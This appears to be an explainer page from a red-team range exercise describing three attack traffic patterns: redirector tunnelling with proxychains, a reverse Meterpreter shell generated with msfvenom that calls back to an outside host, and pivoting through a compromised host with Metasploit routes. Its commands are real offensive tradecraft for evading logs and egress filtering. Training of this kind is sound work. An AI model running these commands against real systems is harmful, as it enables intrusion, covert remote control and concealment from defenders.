Pivot & Redirector Mechanics

Three traffic-flow patterns from this week's range exercise, read left to right: attacker → infrastructure → target.

dashed, amber — inside the attacker's own tunnel or control channel
solid, teal — native traffic, as it actually appears to the far side

Mechanism 1 of 3

Redirector + proxychains: hiding the attacker's origin

Every scan or exploit command you run gets forced through a leased redirector before it ever reaches the target — so the target's own logs only ever show the redirector's IP, never yours.

$ proxychains nmap -sT -sC -sV -Pn -p- 131.33.30.10
  1. Stand up the tunnel once: ssh na@<redirector> -i <key> -D 9050 -R *:8080:127.0.0.1:8080
  2. Point proxychains at socks5 127.0.0.1 9050 in its config file
  3. Prefix every tool with proxychains — TCP connect scans only (-sT), never -sS
  4. The redirector makes the outbound connection; the target's firewall and logs see only the redirector's IP
Why it matters If the redirector gets burned or blocked, your attack box and your real location were never exposed to the target network in the first place.

Mechanism 2 of 3

Reverse shell traffic through a multi/handler

A reverse payload flips the direction of mechanism 1: the target initiates the connection outward, so it sails past inbound firewall rules, and the same tunnel you already built carries it back to your listener.

$ msfvenom -p windows/meterpreter/reverse_tcp lhost=64.12.72.94 lport=8080 -f exe -o persist.exe
  1. Set lhost/lport to the redirector's address, not your own box
  2. Generate the payload with msfvenom and get it executing on the target
  3. multi/handler waits on 127.0.0.1:8080 with ReverseAllowProxy true so it can accept a forwarded connection
  4. On execution: payload connects out → redirector :8080 → tunnel → your handler → session established
Why it matters Notice the arrows run opposite mechanism 1 — the target calls you, you never call it. That's what gets a reverse shell past most egress filtering.

Mechanism 3 of 3

Pivoting through a compromised host

Once you own a host that sits on a second subnet you can't otherwise reach, Metasploit can route traffic through that host's own session — a second, independent pivot layered on top of the redirector tunnel.

$ route add 131.33.30.0/24 5 $ search socks_proxy > use 0 > run $ proxychains -f msf-proxy rdesktop 131.33.30.90
  1. Confirm the new subnet from inside the session: ipconfig / sysinfo on session 5
  2. route add 131.33.30.0/24 5 — native Metasploit modules now reach it automatically
  3. search socks_proxy → use 0 → run — starts a local SOCKS listener riding that same route
  4. Point a dedicated proxychains config (msf-proxy) at that listener, then run any external tool through it
Why it matters This pivot doesn't replace the redirector tunnel from mechanism 1 — it stacks on top of it, extending your reach one hop further inside the target network.
